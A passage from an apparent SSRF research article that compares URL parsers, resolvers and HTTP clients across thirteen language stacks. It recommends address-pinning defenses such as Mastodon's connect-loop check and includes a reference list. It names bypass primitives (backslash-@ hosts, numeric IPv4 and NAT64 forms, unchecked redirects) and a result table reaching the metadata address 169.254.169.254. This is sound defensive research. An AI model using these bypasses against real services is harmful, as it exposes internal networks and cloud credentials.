+on the wire. GitLab is F11 alone: dropping the pin and resolving again is the
+weakness, not F11 × F2. Thumbor and Open WebUI prove redirects alone. F7 and
+F9 remain primitives. A chain assembled from separate labs is still not a
+finding.</p>
+<p>RFC 3986 §§7.3-7.4 warned that multiple components interpret URI data during
+dereference and that resolvers accept numeric forms outside the URI grammar.
+RFC 9525 §7.4 later described one component misclassifying an IP as a name
+while the next assumes the IP rule was already enforced. One enforces; the
+next assumes.</p>
+<p>That is prior art for the handoff, not an algebra. The useful result is the
+literal-backslash redirect above: a later entry point ran fewer validators
+and resurrected an old parser split. Every proposed composition still needs
+that request on the wire.</p>
+<h2 id="across-thirteen-audited-stacks">Across thirteen audited stacks</h2>
+<p>The product cases provide the application-level evidence. This matrix is the
+breadth check: URL parsers and HTTP clients across Java (two stacks), Go,
+Python, Node, Rust, C, .NET, PHP, BEAM, Ruby, Swift, and Haskell. A marker
+means at least one tested surface in that column disagreed. It does not mean
+every client is affected, or that an application exposes the primitive.</p>
+<pre class="astro-code github-dark-default" style="background-color:#0d1117;color:#e6edf3; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>U  raw URL payload                 A  API-shape case</span></span>
+<span class="line"><span>D  resolver handoff                H  H/2 or H/1-vs-H/2 wire</span></span>
+<span class="line"><span>T  TLS / SNI identity              V  version/backend/flag dependent</span></span>
+<span class="line"><span>-  not observed</span></span></code></pre>
+<p>J1 is JDK URI/HttpClient plus OkHttp. J2 is Apache HttpClient, Netty,
+Reactor-Netty, and Jetty. The remaining abbreviations are language names.
+F4, F8, F9, and F11 depend on comparison, application lifecycle,
+serialization, or a discarded pin; their evidence lives in the case studies
+rather than this URL/API matrix.</p>
+<pre class="astro-code github-dark-default" style="background-color:#0d1117;color:#e6edf3; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>Family                                | J1  | J2  | Go  | Py  | Nd  | Rs  | C</span></span>
+<span class="line"><span>---------------------------------------------------------------------------</span></span>
+<span class="line"><span>F1  Grammar drift / parser entrypoint | U   | U   | U   | U   | U   | U   | U</span></span>
+<span class="line"><span>F1  Backslash + `@` authority         | U   | U   | U   | U   | U   | U   | U</span></span>
+<span class="line"><span>F1  Multi-`@` userinfo / host split   | U   | U   | U   | U   | U   | U   | U</span></span>
+<span class="line"><span>F1  Percent-encoded host delimiters   | U   | U   | U   | U   | U   | U   | U</span></span>
+<span class="line"><span>F12 IPv4 numeric forms                | UD  | UD  | UD  | UD  | UD  | U   | UDV</span></span>
+<span class="line"><span>F12 IPv6 text / zone / mapped forms   | U   | U   | U   | U   | U   | UT  | U</span></span>
+<span class="line"><span>F5a `%2E%2E` dot-segment collapse     | U   | U   | U   | U   | U   | U   | UV</span></span>
+<span class="line"><span>F6  Host header to H/2 `:authority`   | AH  | AH  | AHT | AHT | AH  | AH  | AH</span></span>
+<span class="line"><span>F7  Direct H/2 pseudo-header gaps     | -   | AH  | H   | H   | AH  | -   | AH</span></span>
+<span class="line"><span>F2  DNS resolver differential         | -   | AD  | DV  | D   | D   | AD  | DV</span></span>
+<span class="line"><span>F5b Redirect without target recheck   | A   | A   | A   | A   | A   | A   | -</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>Family                                | DN  | PHP | BE  | Rb  | Sw  | Hs</span></span>
+<span class="line"><span>----------------------------------------------------------------------</span></span>
+<span class="line"><span>F1  Grammar drift / parser entrypoint | U   | U   | U   | U   | U   | U</span></span>
+<span class="line"><span>F1  Backslash + `@` authority         | -   | U   | U   | U   | U   | U</span></span>
+<span class="line"><span>F1  Multi-`@` userinfo / host split   | U   | U   | U   | U   | U   | U</span></span>
+<span class="line"><span>F1  Percent-encoded host delimiters   | -   | U   | U   | U   | U   | U</span></span>
+<span class="line"><span>F12 IPv4 numeric forms                | U   | UD  | UD  | UD  | UD  | UD</span></span>
+<span class="line"><span>F12 IPv6 text / zone / mapped forms   | U   | U   | U   | U   | U   | U</span></span>
+<span class="line"><span>F5a `%2E%2E` dot-segment collapse     | U   | U   | U   | U   | U   | U</span></span>
+<span class="line"><span>F6  Host header to H/2 `:authority`   | AH  | AH  | AHT | AH  | AHT | AH</span></span>
+<span class="line"><span>F7  Direct H/2 pseudo-header gaps     | -   | -   | AH  | -   | AH  | AH</span></span>
+<span class="line"><span>F2  DNS resolver differential         | D   | D   | D   | D   | D   | D</span></span>
+<span class="line"><span>F5b Redirect without target recheck   | A   | A   | A   | A   | A   | A</span></span></code></pre>
+<p>Three rows show the broadest recurrence. F1 appears in all thirteen audited
+columns: mixing parser entrypoints remains dangerous. F6 also spans this
+matrix, but it is an API shape—an application must expose attacker-controlled
+<code>Host</code>. F5b appears in twelve audited columns because at least one tested
+client follows redirects by default; C is empty because libcurl and the
+tested nghttp client default to no-follow.</p>
+<p>F7 is thinner: eight columns contain at least one tested pseudo-header seam,
+six contain a full application-API-to-wire result, and no guarded product in
+the audited set assembled it. IPv4 numeric forms appeared in all thirteen
+audited columns, but Rust and .NET canonicalize before the resolver handoff,
+so their cells lack <code>D</code>. These differences are why the matrix is a test map,
+not a vulnerability count.</p>
+<p>Secure shapes exist. JDK <code>HttpClient</code> restricts <code>Host</code> by default. Apache
+HttpClient can keep route and authority on one <code>HttpHost</code>. Bitwarden pins by
+rewriting <code>RequestUri</code> to the selected literal. Mastodon checks each address
+inside the connect loop. The seam is common, not inevitable.</p>
+<h3 id="the-same-question-asked-of-the-libraries-directly">The same question, asked of the libraries directly</h3>
+<p>The matrix above is a test map built by hand. To turn it into a distribution I
+built a differential oracle. The same crafted input goes to every library at
+every stage, and the four-value tuple <code>{validator-host, resolver-IP, emitted :authority, dialed-IP}</code> is diffed across each hop. One run produces 1855
+verdicts across 16 validators and 5 clients in 8 languages.</p>
+<p>Asked about the changedetection.io shape from the backslash case above,
+delivered through an F5b redirect, the library layer splits four ways:</p>
+<pre class="astro-code github-dark-default" style="background-color:#0d1117;color:#e6edf3; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>validator (parses the redirect target)         -> host            client        -> dialed         verdict</span></span>
+<span class="line"><span>---------------------------------------------------------------------------------------------------------</span></span>
+<span class="line"><span>fasthttp / urllib.parse / Python urlsplit       example.com       urllib3        169.254.169.254  SURVIVES</span></span>
+<span class="line"><span>whatwg-url / Node WHATWG / legacy url.parse     169.254.169.254   urllib3        169.254.169.254  BLOCKED</span></span>
+<span class="line"><span>net/url / yarl                                  REJECT (invalid)  urllib3        -                PARSE-REJECT</span></span>
+<span class="line"><span>any                                             example.com       libcurl / Go   example.com      AGREE / BLOCKED</span></span></code></pre>
+<p>No parser here is wrong. The bug is a validator that reads the backslash as
+userinfo paired with a fetcher that reads it as a host terminator, and the oracle
+enumerates which pairs land there. Four real clients behave four different ways.</p>
+<p>The negative control holds. The <code>%5C@</code> variant makes every parser re-agree on
+<code>example.com</code> and survivals drop to zero, which is what makes the first result
+worth reporting.</p>
+<p>The full oracle is published separately: what it instruments, the per-classifier
+gap totals, the IDN engine divergence, the F1-F15 taxonomy including the three
+families this article does not reach, and the unchecked cells of the seam space. <a href="/post/ssrf-pipeline/">The URL Parser Cheatsheet</a>.</p>
+<h2 id="defense-the-mastodon-pattern-per-language">Defense: the Mastodon pattern, per language</h2>
+<p>The required controls are consistent across languages. Prefer an allowlist
+when the use case has a fixed destination set. Otherwise, resolve the host,
+evaluate each address immediately before attempting it against direct
+special-use ranges and the deployment’s routed translation prefixes, then
+dial that literal. Rejecting the whole answer set if any member is forbidden
+is a valid stricter policy. Apply the same procedure to every redirect target
+and enforce network egress separately.</p>
+<p>The Ruby reference is Mastodon. <code>app/lib/request.rb:285-365</code>:</p>
+<pre class="astro-code github-dark-default" style="background-color:#0d1117;color:#e6edf3; overflow-x: auto;" tabindex="0" data-language="python"><code><span class="line"><span style="color:#FF7B72">class</span><span style="color:#E6EDF3"> Socket </span><span style="color:#FF7B72">&#x3C;</span><span style="color:#E6EDF3"> TCPSocket</span></span>
+<span class="line"><span style="color:#FF7B72">  class</span><span style="color:#FF7B72"> &#x3C;&#x3C;</span><span style="color:#79C0FF"> self</span></span>
+<span class="line"><span style="color:#FF7B72">    def</span><span style="color:#79C0FF"> open</span><span style="color:#E6EDF3">(host, </span><span style="color:#FF7B72">*</span><span style="color:#E6EDF3">args)</span></span>
+<span class="line"><span style="color:#79C0FF">      ...</span></span>
+<span class="line"><span style="color:#E6EDF3">      addresses.each do </span><span style="color:#FF7B72">|</span><span style="color:#E6EDF3">address</span><span style="color:#FF7B72">|</span></span>
+<span class="line"><span style="color:#E6EDF3">        check_private_address(address, host)</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#E6EDF3">        sock     </span><span style="color:#FF7B72">=</span><span style="color:#E6EDF3"> ::Socket.new(address.match</span><span style="color:#FFA198;font-style:italic">?</span><span style="color:#E6EDF3">(Resolv::IPv6::Regex) </span><span style="color:#FFA198;font-style:italic">?</span></span>
+<span class="line"><span style="color:#E6EDF3">                                ::Socket::</span><span style="color:#79C0FF">AF_INET6</span><span style="color:#E6EDF3"> : ::Socket::</span><span style="color:#79C0FF">AF_INET</span><span style="color:#E6EDF3">,</span></span>
+<span class="line"><span style="color:#E6EDF3">                                ::Socket::</span><span style="color:#79C0FF">SOCK_STREAM</span><span style="color:#E6EDF3">, </span><span style="color:#79C0FF">0</span><span style="color:#E6EDF3">)</span></span>
+<span class="line"><span style="color:#E6EDF3">        sockaddr </span><span style="color:#FF7B72">=</span><span style="color:#E6EDF3"> ::Socket.pack_sockaddr_in(port, address.to_s)</span></span>
+<span class="line"><span style="color:#79C0FF">        ...</span></span>
+<span class="line"><span style="color:#E6EDF3">        sock.connect_nonblock(sockaddr)</span></span>
+<span class="line"><span style="color:#79C0FF">        ...</span></span>
+<span class="line"><span style="color:#E6EDF3">      end</span></span>
+<span class="line"><span style="color:#79C0FF">      ...</span></span>
+<span class="line"><span style="color:#E6EDF3">    end</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#FF7B72">    def</span><span style="color:#D2A8FF"> check_private_address</span><span style="color:#E6EDF3">(address, host)</span></span>
+<span class="line"><span style="color:#E6EDF3">      addr </span><span style="color:#FF7B72">=</span><span style="color:#E6EDF3"> IPAddr.new(address.to_s)</span></span>
+<span class="line"><span style="color:#79C0FF">      ...</span></span>
+<span class="line"><span style="color:#FF7B72">      raise</span><span style="color:#E6EDF3"> Mastodon::PrivateNetworkAddressError, host </span><span style="color:#FF7B72">if</span></span>
+<span class="line"><span style="color:#E6EDF3">          PrivateAddressCheck.private_address</span><span style="color:#FFA198;font-style:italic">?</span><span style="color:#E6EDF3">(addr)</span></span>
+<span class="line"><span style="color:#E6EDF3">    end</span></span>
+<span class="line"><span style="color:#E6EDF3">  end</span></span>
+<span class="line"><span style="color:#E6EDF3">end</span></span></code></pre>
+<p>On Mastodon’s normal direct path, the validator runs inside the connect loop
+for each address the client attempts. It runs immediately before
+<code>connect_nonblock</code>, and the socket dials that literal rather than re-resolving
+the name. The loop may return after the first successful connection, so this
+is not a pre-screen of every DNS answer. Redirect targets enter the same
+direct path. If <code>use_proxy?</code> or <code>@allow_local</code> is true, Mastodon selects
+<code>ProxySocket</code>, whose <code>check_private_address</code> is a no-op. The direct path
+handles F2, F5b, and F11, but not F12’s classifier coverage.
+The policy must know the deployment’s routed prefixes; no fixed public list
+can decode an arbitrary operator-selected NAT64 prefix.</p>
+<p>Per-language equivalents use the same requirement: the
+client must expose a hook between resolve and connect where the application
+inspects the resolved address and dials <em>that exact address</em> instead of the
+name.</p>
+<ul>
+<li><strong>C / libcurl.</strong> <code>CURLOPT_RESOLVE</code> (<code>hostname:port:ip</code>) pins the resolved address; libcurl will not re-resolve. Pair with <code>CURLOPT_PROTOCOLS_STR</code> / <code>CURLOPT_REDIR_PROTOCOLS_STR</code> set to <code>http,https</code> so a redirect to <code>gopher://</code> or <code>file://</code> cannot land.</li>
+<li><strong>Go.</strong> <code>http.Transport.DialContext</code> is the canonical pin hook; Doyensec’s <code>safeurl</code> [35] is a reference implementation. It runs the allow/block list against the <em>actual dialed IP</em> through the dialer <code>Control</code> hook. Include Security shipped related Python, Ruby, and PHP implementations as SafeURL and SafeCURL in 2016 [36]. Pinning the dial address does <em>not</em> pin <code>:authority</code> against a <code>req.Host</code> override (§7.1); handle that separately.</li>
+<li><strong>.NET.</strong> <code>SocketsHttpHandler.ConnectCallback</code> is one pinning hook. Bitwarden uses another valid design: resolve and validate, rewrite <code>RequestUri</code> to the selected IP, and preserve the original host in the <code>Host</code> header. Its F12 defect is in the classifier, not the pin.</li>
+<li><strong>Java.</strong> OkHttp exposes a per-client <code>Dns</code> interface, and Apache HttpClient exposes <code>DnsResolver</code>. JDK <code>HttpClient</code> exposes neither a per-client resolver nor a custom <code>SocketFactory</code>. Java 18 and later provide <code>InetAddressResolverProvider</code>, but it installs one system-wide resolver for the JVM. It is not a per-request pinning hook [39].</li>
+<li><strong>Node.</strong> An Undici connector receives connection options such as <code>hostname</code>, <code>port</code>, and <code>servername</code>; it does not receive a resolved address list. A custom connector or <code>lookup</code> function must resolve, validate, and dial a selected literal while preserving the original name for TLS. An Agent applies to <code>fetch</code> only when passed as the request’s <code>dispatcher</code> or installed with <code>setGlobalDispatcher()</code> [40].</li>
+<li><strong>Rust.</strong> <code>reqwest::Client::builder().resolve(host, addr)</code> pins at the client level; for per-request pinning, wrap <code>hyper</code>’s connector with a validating resolver.</li>
+<li><strong>PHP.</strong> Guzzle over the curl handler with <code>CURLOPT_RESOLVE</code> in <code>curl</code> options; the validator must compute the pin and set it.</li>
+</ul>
+<p><strong>Validate the fetcher’s representation, then bind it to use.</strong> Parsing with
+the same library is necessary but not sufficient. <code>urllib3.util.parse_url</code>
+avoids the changedetection parser split, but the resolved address still has
+to be carried into the connection and every redirect target needs the same
+policy. <code>URI.parse(url)</code> is what <code>Net::HTTP</code> will dial; check that instead of
+the output of a <code>gsub</code> chain. Validate the fetcher’s canonical parse output,
+or convert the URL once into a <code>(scheme, host, port, ip, path)</code> tuple and do
+not pass the original string downstream.</p>
+<h2 id="where-the-blade-stopped">Where the blade stopped</h2>
+<p>A primitive is not a product bug, a classifier pass is not a routed packet,
+and two working legs are not a chain. The audit produced useful dead ends;
+this is the relevant compressed record.</p>
+<h3 id="mechanisms-without-a-guarded-product">Mechanisms without a guarded product</h3>
+<p>F7 needs three conditions in one process: a destination policy, direct
+attacker control of H/2 <code>:authority</code> or <code>:path</code>, and no validation of that
+field. Netty, <code>node:http2</code>, nghttp2, Swift NIO, Haskell <code>http2</code>, and BEAM
+expose enough API surface to build the split. None of the audited products
+exposed all three conditions.</p>
+<p>F9 is equally bounded. Node v20, v22, v24, and v26.1.0 narrowed the same
+Unicode strings to the same bytes over TLS H/2 and h2c, but the product hunt
+stopped before a trust boundary. APNs wrappers stripped or encoded the
+input; SigV4 made the wire mismatch fail authentication; the other audited
+callers did not let attacker-controlled Unicode reach direct <code>node:http2</code>
+fields. The runtime defect is real. A product exploit is not claimed.</p>
+<h3 id="bytes-that-did-not-become-routes">Bytes that did not become routes</h3>
+<p>The F12 rule is simple: <code>decodes to</code> does not mean <code>routes to</code>. CGNAT needs
+an on-link network or another route to <code>100.64.0.0/10</code>. NAT64 and SIIT need
+the matching prefix, translator, and IPv4 route. The AWS, ThingsBoard, and
+Nextcloud cases in §5.3 supplied those paths; classifier-only Mattermost and
+Mastodon trials ended in timeout or <code>ENETUNREACH</code>. 6to4 and Teredo carry
+routing or tunnel metadata, not a generic HTTP destination. IPv4-compatible
+semantics are deprecated. No route, no delivery claim.</p>
+<p>Managed infrastructure makes the condition practical, not automatic. AWS
+NAT Gateway can carry <code>64:ff9b::/96</code> to supported private IPv4 routes; GCP
+Private NAT64 can do the same. Using the well-known prefix for non-global
+IPv4 falls outside RFC 6052 §3.1, but it is deployed behavior. It remains an
+operator-created route, not a property of every IPv6 host.</p>
+<p>Alt-Svc, HTTPS records, and ORIGIN [5][6][7] produced component behavior but
+no product chain in this audit. For an already-HTTPS URI, Alt-Svc and HTTPS
+records can select another endpoint without changing the origin. ORIGIN can
+authorize another origin on an existing connection only when the peer
+certificate covers it. HTTP/3 retains the <code>Host</code>/<code>:authority</code> requirement and
+rejects invalid decoded fields [4]. None of the audited products joined those
+mechanisms to an attacker-controlled internal fetch.</p>
+<p>The RFC 7540-versus-9113 <code>Host</code>/<code>:authority</code> difference also stopped at one
+h2c origin. Go and Node exposed both values to application code; hyper-h2
+rejected the mismatch and Apache normalized it. nginx rejected it, while
+Caddy, HAProxy, and Envoy rebuilt <code>Host</code> from <code>:authority</code>. No tested proxy
+forwarded the split, so there is no proxy-chain desync finding.</p>
+<h3 id="the-empirical-boundary">The empirical boundary</h3>
+<p>Within the products and paths tested in this audit, one composition was
+wire-confirmed: changedetection.io at F1 × F5b. GitLab is F11 by itself;
+Thumbor and Open WebUI are F5b by themselves. No tested product path carried
+F7 or F9 into a second family. A plausible chain assembled from separate
+labs remains unconfirmed until its combined request reaches the wire.</p>
+<p>The opening Mealie trace is the compact model: the guard approved A and the
+fetcher dialed AAAA. The other families change which representation is lost,
+not the invariant. A verdict that does not survive into the object, resolver,
+socket, authority, and next hop is only a comment on an earlier state.</p>
+<h2 id="prior-art-and-acknowledgements">Prior art and acknowledgements</h2>
+<p>The method starts with Orange Tsai’s <em>A New Era of SSRF</em> (Black Hat USA
+2017) [0]: compare the parsers an application applies to one URL. Tsai
+applied that method to the URL parser and HTTP/1 requester. This article
+applies it after parsing, through resolution, object mutation, authority
+emission, and redirects.</p>
+<p>The parse-stage seam in §4 was mapped long before this audit. Claroty Team82
+and Snyk cross-tested sixteen libraries in <em>Exploiting URL Parsing
+Confusion</em> (2022) [18] and named the validate-with-one-parser,
+fetch-with-another failure. Reynolds, Bates and Bailey’s <em>Equivocal URLs</em>
+(ESORICS 2022) [29] and Ajmani, Koishybayev and Kapravelos’s <em>yoU aRe a Liar</em>
+(SecWeb 2022) [30] put the parser-differential class on a formal footing.
+Daniel Stenberg’s <em>My URL isn’t your URL</em> (2016) [31] states the rule plainly:
+do not mix parsers. The F6 and F7 Host-header and HTTP/2 <code>:authority</code>
+primitives descend from James Kettle’s <em>Cracking the Lens</em> and <em>HTTP/2: The
+Sequel is Always Worse</em> [28][17].</p>
+<p>The IPv6-transition classifier gap (§5.3, F12) has been documented
+independently and contemporaneously across the 2026 public advisory and
+research stream [19]-[24]. This audit contributes breadth, the
+routes-to-versus-decodes-to correction, and the cloud-routing observation,
+not the family itself.</p>
+<p>Thanks to the maintainers of JDK, .NET, Go, Node.js, Apache HttpComponents,
+curl, PHP, Ruby URI, OkHttp, undici, Jetty, Reactor Netty, Swift Foundation,
+Haskell <code>http-client</code> and <code>http2</code>, WHATWG URL, and Ada URL. Thanks also to the
+projects whose maintainers reviewed these findings.</p>
+<p>Language-model tools assisted source navigation and draft review. The author
+verified the PoCs, wire transcripts, and final claims.</p>
+<p>The source excerpts, conditions, and wire transcripts above are the article’s
+public proof record.</p>
+<h2 id="references">References</h2>
+<p>[0]  Orange Tsai, “A New Era of SSRF: Exploiting URL Parser in</p>
+<pre class="astro-code github-dark-default" style="background-color:#0d1117;color:#e6edf3; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>Trending Programming Languages", Black Hat USA 2017.</span></span>
+<span class="line"><span>https://www.blackhat.com/docs/us-17/thursday/us-17-Tsai-A-New-Era-Of-SSRF.pdf</span></span></code></pre>
+<p>[1]  RFC 3986, “Uniform Resource Identifier (URI): Generic</p>
+<pre class="astro-code github-dark-default" style="background-color:#0d1117;color:#e6edf3; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>Syntax", 2005. https://www.rfc-editor.org/rfc/rfc3986</span></span></code></pre>
+<p>[2]  RFC 9110, “HTTP Semantics”, 2022.</p>
+<pre class="astro-code github-dark-default" style="background-color:#0d1117;color:#e6edf3; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>https://www.rfc-editor.org/rfc/rfc9110</span></span></code></pre>
+<p>[3]  RFC 9113, “HTTP/2”, 2022.</p>
+<pre class="astro-code github-dark-default" style="background-color:#0d1117;color:#e6edf3; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>https://www.rfc-editor.org/rfc/rfc9113</span></span></code></pre>
+<p>[4]  RFC 9114, “HTTP/3”, 2022.</p>
+<pre class="astro-code github-dark-default" style="background-color:#0d1117;color:#e6edf3; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>https://www.rfc-editor.org/rfc/rfc9114</span></span></code></pre>
+<p>[5]  RFC 7838, “HTTP Alternative Services”, 2016.</p>
+<pre class="astro-code github-dark-default" style="background-color:#0d1117;color:#e6edf3; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>https://www.rfc-editor.org/rfc/rfc7838</span></span></code></pre>
+<p>[6]  RFC 8336, “ORIGIN HTTP/2 Frame”, 2018.</p>
+<pre class="astro-code github-dark-default" style="background-color:#0d1117;color:#e6edf3; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>https://www.rfc-editor.org/rfc/rfc8336</span></span></code></pre>
+<p>[7]  RFC 9460, “Service Binding and Parameter Specification via</p>
+<pre class="astro-code github-dark-default" style="background-color:#0d1117;color:#e6edf3; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>the DNS (SVCB and HTTPS Resource Records)", 2023.</span></span>
+<span class="line"><span>https://www.rfc-editor.org/rfc/rfc9460</span></span></code></pre>
+<p>[8]  RFC 6052, “IPv6 Addressing of IPv4/IPv6 Translators”,</p>
+<pre class="astro-code github-dark-default" style="background-color:#0d1117;color:#e6edf3; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>2010. https://www.rfc-editor.org/rfc/rfc6052</span></span></code></pre>
+<p>[9]  RFC 6146, “Stateful NAT64”, 2011.</p>
+<pre class="astro-code github-dark-default" style="background-color:#0d1117;color:#e6edf3; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>https://www.rfc-editor.org/rfc/rfc6146</span></span></code></pre>
+<p>[10] RFC 8305, “Happy Eyeballs Version 2”, 2017.</p>
+<pre class="astro-code github-dark-default" style="background-color:#0d1117;color:#e6edf3; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>https://www.rfc-editor.org/rfc/rfc8305</span></span></code></pre>
+<p>[11] WHATWG URL Living Standard.</p>
+<pre class="astro-code github-dark-default" style="background-color:#0d1117;color:#e6edf3; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>https://url.spec.whatwg.org/</span></span></code></pre>
+<p>[12] CVE-2017-3164 and CVE-2021-27905: Apache Solr <code>shards</code></p>
+<pre class="astro-code github-dark-default" style="background-color:#0d1117;color:#e6edf3; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>SSRF.</span></span>
+<span class="line"><span>https://nvd.nist.gov/vuln/detail/CVE-2017-3164</span></span>
+<span class="line"><span>https://nvd.nist.gov/vuln/detail/CVE-2021-27905</span></span></code></pre>
+<p>[13] CVE-2018-12116: Node.js HTTP/1 client hostname-spoofing /</p>
+<pre class="astro-code github-dark-default" style="background-color:#0d1117;color:#e6edf3; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>header smuggling.</span></span>
+<span class="line"><span>https://nodejs.org/en/blog/vulnerability/november-2018-security-releases/</span></span></code></pre>
+<p>[14] CVE-2026-45401: Open WebUI redirect-follow SSRF</p>
+<pre class="astro-code github-dark-default" style="background-color:#0d1117;color:#e6edf3; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>(GHSA-rh5x-h6pp-cjj6); the F5b Playwright finding in §8.2</span></span>
+<span class="line"><span>extends the parent advisory to a sixth code path.</span></span>
+<span class="line"><span>https://github.com/open-webui/open-webui/security/advisories/GHSA-rh5x-h6pp-cjj6</span></span></code></pre>
+<p>[15] GHSA-cc8x-jrqv-hmwh: FastGPT DNS rebinding SSRF.</p>
+<pre class="astro-code github-dark-default" style="background-color:#0d1117;color:#e6edf3; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>https://github.com/labring/FastGPT/security/advisories/GHSA-cc8x-jrqv-hmwh</span></span></code></pre>
+<p>[16] GHSA-wvjg-9879-3m7w: AutoGPT DNS rebinding SSRF.</p>
+<pre class="astro-code github-dark-default" style="background-color:#0d1117;color:#e6edf3; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>https://github.com/Significant-Gravitas/AutoGPT/security/advisories/GHSA-wvjg-9879-3m7w</span></span></code></pre>
+<p>[17] PortSwigger, “HTTP/2: The Sequel is Always Worse”.</p>
+<pre class="astro-code github-dark-default" style="background-color:#0d1117;color:#e6edf3; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>https://portswigger.net/research/http2</span></span></code></pre>
+<p>[18] Claroty Team82 / Snyk, “Exploiting URL Parsing Confusion”,</p>
+<pre class="astro-code github-dark-default" style="background-color:#0d1117;color:#e6edf3; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>Jan 2022.</span></span>
+<span class="line"><span>https://claroty.com/team82/research/exploiting-url-parsing-confusion</span></span></code></pre>
+<p>[19] CVE-2026-44430: MCP Registry SSRF via IPv6 transition</p>
+<pre class="astro-code github-dark-default" style="background-color:#0d1117;color:#e6edf3; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>forms.</span></span>
+<span class="line"><span>https://github.com/modelcontextprotocol/registry/security/advisories/GHSA-r48c-v28r-pf6v</span></span></code></pre>
+<p>[20] CVE-2026-44232: dssrf NPM module SSRF via IPv6 categories.</p>
+<pre class="astro-code github-dark-default" style="background-color:#0d1117;color:#e6edf3; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>https://github.com/HackingRepo/dssrf-js/security/advisories/GHSA-8p33-q827-ghj5</span></span></code></pre>
+<p>[21] CVE-2026-44589: nuxt-og-image SSRF re-bypass via IPv6</p>
+<pre class="astro-code github-dark-default" style="background-color:#0d1117;color:#e6edf3; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>forms.</span></span>
+<span class="line"><span>https://github.com/nuxt-modules/og-image/security/advisories/GHSA-c2rm-g55x-8hr5</span></span></code></pre>
+<p>[22] CVE-2026-46678: Pydantic-AI SSRF cloud-metadata blocklist</p>
+<pre class="astro-code github-dark-default" style="background-color:#0d1117;color:#e6edf3; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>bypass via IPv6 transition forms.</span></span>
+<span class="line"><span>https://github.com/pydantic/pydantic-ai/security/advisories/GHSA-cqp8-fcvh-x7r3</span></span></code></pre>
+<p>[23] HackerOne #3634400: <code>ssrf_filter</code> (Ruby) bypass via NAT64</p>
+<pre class="astro-code github-dark-default" style="background-color:#0d1117;color:#e6edf3; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>local-use prefix `64:ff9b:1::/48`.</span></span>
+<span class="line"><span>https://hackerone.com/reports/3634400</span></span></code></pre>
+<p>[24] GHSA-jrvc-8ff5-2f9f: openclaw SSRF via full-form</p>
+<pre class="astro-code github-dark-default" style="background-color:#0d1117;color:#e6edf3; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>IPv4-mapped IPv6.</span></span>
+<span class="line"><span>https://github.com/openclaw/openclaw/security/advisories/GHSA-jrvc-8ff5-2f9f</span></span></code></pre>
+<p>[25] GHSA-v2gc-rm6g-wrw9: Craft CMS SSRF via <code>gethostbyname</code></p>
+<pre class="astro-code github-dark-default" style="background-color:#0d1117;color:#e6edf3; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>(IPv4-only) vs Guzzle dual-stack: the direct ancestor of</span></span>
+<span class="line"><span>§5.1's F2 mechanism.</span></span>
+<span class="line"><span>https://github.com/craftcms/cms/security/advisories/GHSA-v2gc-rm6g-wrw9</span></span></code></pre>
+<p>[26] CVE-2026-27696 / GHSA-3c45-4pj5-ch7m: changedetection.io</p>
+<pre class="astro-code github-dark-default" style="background-color:#0d1117;color:#e6edf3; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>SSRF (fixed 0.54.1). §4.1's finding survives this fix</span></span>
+<span class="line"><span>because the patched `is_private_hostname` consumes</span></span>
+<span class="line"><span>`urlparse(url).hostname`, the same parser the three-parser</span></span>
+<span class="line"><span>disagreement is about.</span></span>
+<span class="line"><span>https://github.com/dgtlmoon/changedetection.io/security/advisories/GHSA-3c45-4pj5-ch7m</span></span></code></pre>
+<p>[27] CVE-2024-31991 / CVE-2024-31993: Mealie SSRF predecessors,</p>
+<pre class="astro-code github-dark-default" style="background-color:#0d1117;color:#e6edf3; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>fixed in 1.4.0 by adding the `safehttp` module. §5.1's</span></span>
+<span class="line"><span>finding is in the new guard.</span></span>
+<span class="line"><span>https://nvd.nist.gov/vuln/detail/CVE-2024-31991</span></span>
+<span class="line"><span>https://nvd.nist.gov/vuln/detail/CVE-2024-31993</span></span></code></pre>
+<p>[28] James Kettle, “Cracking the Lens: Targeting HTTP’s Hidden</p>
+<pre class="astro-code github-dark-default" style="background-color:#0d1117;color:#e6edf3; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>Attack Surface", Black Hat USA 2017. §7.1's F6 and §7.2's</span></span>
+<span class="line"><span>F7 are its egress dual.</span></span>
+<span class="line"><span>https://portswigger.net/research/cracking-the-lens-targeting-https-hidden-attack-surface</span></span></code></pre>
+<p>[29] J. Reynolds, A. Bates, M. Bailey, “Equivocal URLs:</p>
